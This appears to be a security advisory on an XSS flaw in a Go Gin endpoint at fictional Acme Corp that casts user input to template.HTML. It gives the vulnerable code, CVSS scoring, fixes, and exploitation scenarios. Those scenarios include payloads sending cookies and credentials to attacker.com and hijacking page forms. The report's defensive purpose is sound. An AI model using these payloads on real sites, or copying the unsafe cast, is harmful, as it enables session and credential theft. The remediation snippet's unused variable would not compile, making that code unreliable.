# Cross-Site Scripting (XSS) via Unvalidated template.HTML Type Casting

# Vulnerability Case
During a recent security assessment of Acme Corp's web application, built using the Go programming language with the Gin framework, we discovered a Cross-Site Scripting (XSS) vulnerability via Unvalidated template.HTML Type Casting. The issue arose when untrusted user input was accepted via a query parameter and directly cast to `template.HTML` without proper validation, bypassing Go's `html/template` package's automatic escaping mechanism before being rendered in a dynamic web template. Detailed code review and dynamic testing revealed that this unsanitized input could enable attackers to inject crafted HTML or JavaScript payloads, thereby potentially compromising user sessions. The vulnerability was identified on the vulnerable `/welcome` endpoint through both source code analysis and fuzz testing. This flaw poses business risks, including session hijacking, unauthorized data access, and potential compromise of user credentials in a production environment built using the Go Gin stack with the standard `html/template` package.

```go
package main

import (
        "html/template"
        "net/http"

        "github.com/gin-gonic/gin"
)

func main() {
        router := gin.New()

        // Define a basic HTML template that renders the username parameter directly.
        // The use of template.HTML() bypasses Go's html/template package's automatic escaping.
        tmpl := template.Must(template.New("welcome").Parse(`
                <!DOCTYPE html>
                <html>
                <head>
                        <title>Welcome to Acme Corp</title>
                </head>
                <body>
                        <h1>Welcome, {{.Username}}</h1>
                </body>
                </html>
        `))
        router.SetHTMLTemplate(tmpl)

        // Vulnerable endpoint: user input is cast to template.HTML without validation.
        router.GET("/welcome", func(c *gin.Context) {
                // Untrusted input directly obtained from user query, e.g., ?username=<script>...</script>
                username := c.Query("username")
                c.HTML(http.StatusOK, "welcome", gin.H{
                        "Username": template.HTML(username), // Vulnerability: unvalidated input marked as safe
                })
        })

        router.Run(":8080")
}
```

The vulnerability stems from the misuse of Go's `template.HTML` function, which is designed to mark trusted HTML content as safe, but in this case is used directly on untrusted input. An attacker can exploit this by injecting malicious script tags or HTML content into the `username` parameter, resulting in arbitrary JavaScript execution within the victim's browser. This can lead to business impacts such as session hijacking, credential theft, and unauthorized data access. Furthermore, since the vulnerable endpoint is a part of Acme Corp's production infrastructure running on a modern Go and Gin stack, exploiting this vulnerability could have effects across the user base.

context: go.gin.xss.gin-formatted-template-string-taint.formatted-template-string-taint Untrusted input could be used to tamper with a web page rendering, which can lead to a Cross-site scripting (XSS) vulnerability. XSS vulnerabilities occur when untrusted input executes malicious JavaScript code, leading to issues such as account compromise and sensitive information leakage. To prevent this vulnerability, validate the user input, perform contextual output encoding or sanitize the input. For more information, see: [Go XSS prevention](https://semgrep.dev/docs/cheat-sheets/go-xss/).

# Vulnerability Breakdown
This vulnerability involves a persistent cross-site scripting (XSS) issue in Acme Corp's Go web application built with the Gin framework. The vulnerability allows attackers to inject malicious JavaScript code that executes in users' browsers.

1. **Key vulnerability elements**:
   - Untrusted user input from the `username` query parameter is directly cast to Go's `template.HTML` type without validation
   - The `template.HTML` type explicitly bypasses Go's automatic HTML escaping mechanism
   - The unescaped content is directly rendered in the page template
   - The vulnerable endpoint `/welcome` is accessible in the production environment

2. **Potential attack vectors**:
   - Crafting malicious URLs containing JavaScript in the `username` parameter
   - Social engineering users to click on specially crafted links
   - Potentially storing the XSS payload if the username gets saved to a database
   - Multi-step attacks combining XSS with CSRF to perform actions as the victim

3. **Severity assessment**:
   - The vulnerability enables client-side code execution in victim browsers
   - Can lead to session hijacking, credential theft, and data exfiltration
   - The attack is relatively easy to execute once discovered
   - Impacts all users who visit the vulnerable page with malicious input

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): High (H) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Changed (C)
   - Confidentiality (C): Low (L) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

# Description
A Cross-Site Scripting (XSS) vulnerability exists in Acme Corp's web application built with Go and the Gin framework. The vulnerability is present in the `/welcome` endpoint, which accepts a `username` parameter via query string and renders it directly in a web page template.

The core issue is that the application takes untrusted user input and explicitly casts it to `template.HTML`, which instructs Go's templating engine to bypass its automatic HTML escaping protection:

```go
router.GET("/welcome", func(c *gin.Context) {
    username := c.Query("username")
    c.HTML(http.StatusOK, "welcome", gin.H{
        "Username": template.HTML(username), // Vulnerability: bypasses HTML escaping
    })
})

```

By casting the user input to `template.HTML`, the application marks this content as "trusted HTML" that should not be escaped, allowing attackers to inject malicious JavaScript code that will execute in the victim's browser context. This vulnerability can lead to session hijacking, credential theft, and unauthorized access to sensitive information.

# CVSS
**Score**: 4.7 \
**Vector**: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N \
**Severity**: Medium

The Medium severity rating (CVSS score of 4.7) is based on the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability is exploitable remotely over the internet by anyone who can send web requests to the application.

- **High Attack Complexity (AC:H)**: Exploiting this vulnerability requires specific conditions - namely that a victim must visit a specially crafted URL. This social engineering component increases the attack complexity.

- **No Privileges Required (PR:N)**: The vulnerable endpoint doesn't require authentication, allowing unauthenticated attackers to exploit it.

- **User Interaction Required (UI:R)**: For a successful attack, a victim must interact with a malicious link or visit a page with the crafted XSS payload.

- **Changed Scope (S:C)**: The vulnerability affects resources beyond the vulnerable component itself. While the vulnerability exists in the server-side Go application, it affects the victim's browser when executed.

- **Low Confidentiality Impact (C:L)**: The attacker can access some restricted information through the victim's browser, such as session cookies and other sensitive data visible in the DOM.

- **Low Integrity Impact (I:L)**: The attacker can modify some data within the victim's browser context, potentially altering the appearance of the web page or making unauthorized requests on behalf of the victim.

- **No Availability Impact (A:N)**: The vulnerability doesn't affect the availability of the application itself.

While this XSS vulnerability doesn't directly grant complete system access, it provides attackers with significant capabilities to compromise user accounts and steal sensitive information, justifying the Medium severity rating.

# Exploitation Scenarios
**Scenario 1: Session Hijacking**
An attacker crafts a malicious URL targeting Acme Corp users: `https://acme-corp.com/welcome?username=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`. The attacker distributes this URL through phishing emails or social media. When a victim clicks the link, their browser renders the welcome page with the injected script, which sends their session cookie to the attacker's server. The attacker can then use this cookie to impersonate the victim and gain unauthorized access to their account.

**Scenario 2: Credential Harvesting**
An attacker creates a more sophisticated payload: `https://acme-corp.com/welcome?username=<div>Session expired. Please login again:</div><form action='https://attacker.com/steal'><input type='text' placeholder='Username'><input type='password' placeholder='Password'><button>Login</button></form>`. When a victim visits this URL, they see what appears to be a legitimate login form. If they enter their credentials, the information is sent directly to the attacker's server instead of Acme Corp.

**Scenario 3: Stored XSS Escalation**
If the application stores the username parameter for later use (such as in a user profile or dashboard), the XSS payload becomes persistent. An attacker could register with a username containing a malicious script: `<img src="x" onerror="setInterval(function() { document.querySelectorAll('form').forEach(f => { f.action='https://attacker.com/steal'; }) }, 1000)">`. This script would modify all form submissions on the site to send their data to the attacker's server, potentially affecting not just the victim but all users who view the attacker's profile or content.

# Impact Analysis
**Business Impact:**
- Compromise of user accounts and associated sensitive information
- Loss of customer trust if the vulnerability becomes known or exploited at scale
- Potential regulatory violations if personal data is exposed (GDPR, CCPA, etc.)
- Reputational damage to Acme Corp's security posture
- Possible financial losses from fraudulent transactions if the attack leads to account takeovers
- Legal liability if customer data is stolen through this vulnerability
- Resources required for incident response, customer notification, and remediation

**Technical Impact:**
- Unauthorized access to user session data and cookies
- Potential for lateral movement if administrators are compromised
- Bypass of client-side security controls through injected scripts
- Risk of further exploitation through browser vulnerabilities
- Collection of sensitive data entered into the compromised page
- Modification of page content to perform phishing attacks
- Potential use as an entry point for more sophisticated attacks
- Browser-based attacks such as cryptomining or exploitation of other vulnerabilities

# Technical Details
The vulnerability occurs due to a fundamental misunderstanding of Go's template safety mechanisms. The Go `html/template` package automatically escapes HTML content to prevent XSS attacks, but the `template.HTML` type explicitly tells the template engine that the content is pre-trusted and should not be escaped.

**Vulnerable Code Analysis:**

```go
// Define a basic HTML template that renders the username parameter directly.
tmpl := template.Must(template.New("welcome").Parse(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Welcome to Acme Corp</title>
    </head>
    <body>
        <h1>Welcome, {{.Username}}</h1>
    </body>
    </html>
`))
router.SetHTMLTemplate(tmpl)

// Vulnerable endpoint: user input is cast to template.HTML without validation.
router.GET("/welcome", func(c *gin.Context) {
    // Untrusted input directly obtained from user query, e.g., ?username=<script>...</script>
    username := c.Query("username")
    c.HTML(http.StatusOK, "welcome", gin.H{
        "Username": template.HTML(username), // Taint: unvalidated input is marked as safe
    })
})

```

**XSS Attack Vector Explanation:**

1. The application takes the raw `username` value from the query string
2. It casts this value to `template.HTML` without any validation or sanitization
3. This casting explicitly marks the content as trusted HTML that should not be escaped
4. The template engine renders this content directly in the HTML response
5. When a browser loads this response, any JavaScript in the unescaped content executes

**Example Attack Payload:**

A malicious user could craft a URL like:
```
https://acme-corp.com/welcome?username=<script>alert(document.cookie)</script>

```

When rendered, the page would contain:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Welcome to Acme Corp</title>
</head>
<body>
    <h1>Welcome, <script>alert(document.cookie)</script></h1>
</body>
</html>

```

The browser interprets this as valid HTML with an embedded script tag and executes the JavaScript, giving the attacker access to the victim's cookies and potentially enabling session hijacking.

**Technical Context:**

In Go's `html/template` package, content is automatically escaped unless explicitly marked as safe using type conversions like `template.HTML`, `template.JS`, etc. These type conversions should only be used for content that has been generated by the application itself or properly sanitized. The vulnerability occurs because the application is directly casting untrusted user input to `template.HTML` without any validation or sanitization steps, effectively bypassing Go's built-in XSS protection mechanisms.

# Remediation Steps
## Remove Unsafe Type Casting

**Priority**: P0

The immediate fix is to remove the `template.HTML` type casting, allowing Go's automatic HTML escaping to work as designed:

```go
router.GET("/welcome", func(c *gin.Context) {
    username := c.Query("username")
    c.HTML(http.StatusOK, "welcome", gin.H{
        "Username": username, // Fixed: Let Go's template engine escape this automatically
    })
})

```

This change ensures that any HTML special characters in the username (such as `<`, `>`, `&`, `"`, and `'`) will be automatically escaped to their corresponding HTML entities, preventing script execution while still displaying the text content as intended.
## Implement Input Validation and Sanitization

**Priority**: P1

In addition to removing the unsafe type casting, implement proper input validation and sanitization to further protect against XSS and other injection attacks:

```go
import (
    "github.com/gin-gonic/gin"
    "github.com/microcosm-cc/bluemonday"
    "html/template"
    "net/http"
    "regexp"
)

func main() {
    router := gin.New()
    
    // Set up HTML templates
    tmpl := template.Must(template.New("welcome").Parse(`...`))
    router.SetHTMLTemplate(tmpl)
    
    // Define username validation pattern (alphanumeric and spaces only)
    validUsername := regexp.MustCompile(`^[a-zA-Z0-9 ]+$`)
    
    // Create a bluemonday HTML sanitizer policy
    p := bluemonday.StrictPolicy()
    
    router.GET("/welcome", func(c *gin.Context) {
        username := c.Query("username")
        
        // Approach 1: Validate using regex pattern (whitelist approach)
        if !validUsername.MatchString(username) {
            username = "Guest" // Default safe value for invalid input
        }
        
        // Approach 2: Sanitize using HTML sanitizer library
        // username = p.Sanitize(username)
        
        c.HTML(http.StatusOK, "welcome", gin.H{
            "Username": username, // Already safe due to validation AND automatic escaping
        })
    })
    
    router.Run(":8080")
}

```

This implementation provides two layers of protection:

1. Input validation using a whitelist approach (regex pattern matching)
2. Automatic HTML escaping by the template engine

Optionally, you can also use an HTML sanitization library like bluemonday as an additional defense layer.


# References
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* CWE-116 | [Improper Encoding or Escaping of Output](https://cwe.mitre.org/data/definitions/116.html)
